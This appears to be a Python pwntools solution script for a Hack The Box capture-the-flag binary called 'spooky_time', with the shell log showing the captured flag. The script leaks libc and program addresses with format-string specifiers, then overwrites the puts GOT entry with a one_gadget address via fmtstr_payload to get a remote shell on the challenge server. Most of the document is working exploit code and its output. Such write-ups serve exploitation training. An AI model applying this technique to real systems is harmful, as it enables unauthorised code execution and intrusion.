'''
Format String + ROP

gdb-peda$ x/20 $rbp
0x7fffffffe240: 0x0000000000000001      0x00007ffff7dbdd90
0x7fffffffe250: 0x0000000000000000      0x00005555555553c0
'''

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./spooky_time')
libc = ELF('./glibc/libc.so.6')

def detect(io):
	io.sendlineafter('It\'s your chance to scare those little kids, say something scary!\n\n', '%lx.%lx.%lx')
	io.recvuntil('Seriously?? I bet you can do better than \n')
	print io.recvline()
	io.sendlineafter('Anyway, here comes another bunch of kids, let\'s try one more time..\n\n\n', '%lx.'*74)
	io.recvuntil('Ok, you are not good with that, do you think that was scary??\n\n')
	buf = io.recvline().split('.')
	for i in range(len(buf)):
		print str(i+1)+' : '+buf[i]

#io = process('./spooky_time')
ip, port = '178.128.37.153', 32505
io = remote(ip, port)

#first output to a list to analysis
#detect(io)

io.sendlineafter('It\'s your chance to scare those little kids, say something scary!\n\n', '%3$p.%51$p')
io.recvuntil('Seriously?? I bet you can do better than \n')
buf = io.recvline().strip().split('.')
write_addr, main_addr = int(buf[0],16), int(buf[1],16)

#use gdb to find the 3rd output is <__GI___libc_write+23>
libc_base = write_addr - libc.sym.write - 23
elf_base = main_addr - elf.sym.main
print hex(libc_base), hex(elf_base)

#elf.address = elf_base
#libc.address = libc_base
#if set, the following elf/libc.sym/plt/got addresses will all be adjust automatically, otherwise we should manually add the base address...

'''
one_gadget ./glibc/libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
0xebcf5 execve("/bin/sh", r10, rdx)
0xebcf8 execve("/bin/sh", rsi, rdx)
'''
one_gadget = libc_base + 0xebcf1

'''
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './glibc/'

No RELRO, so we can overwrite got, otherwise need to think about other solustions... e.g. the Format challenge.
use fmtstr_payload to overwrite puts in got, as puts will be called after we feed our payload to the binary
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
offset: the first formatter's offset you control
from detect(): first 2e786c252e786c25 (%p.%p...) -> 8
'''

payload = fmtstr_payload(8, {elf_base + elf.got.puts : one_gadget})
io.sendlineafter('Anyway, here comes another bunch of kids, let\'s try one more time..\n\n\n', payload)
io.interactive()

'''
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x1b bytes:
    'flag.txt\n'
    'glibc\n'
    'spooky_time\n'
flag.txt
glibc
spooky_time
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x25 bytes:
    'HTB{d0ubl3_f0rm4t_5tr1ng_w1th_r3lR0}\n'
HTB{d0ubl3_f0rm4t_5tr1ng_w1th_r3lR0}
'''
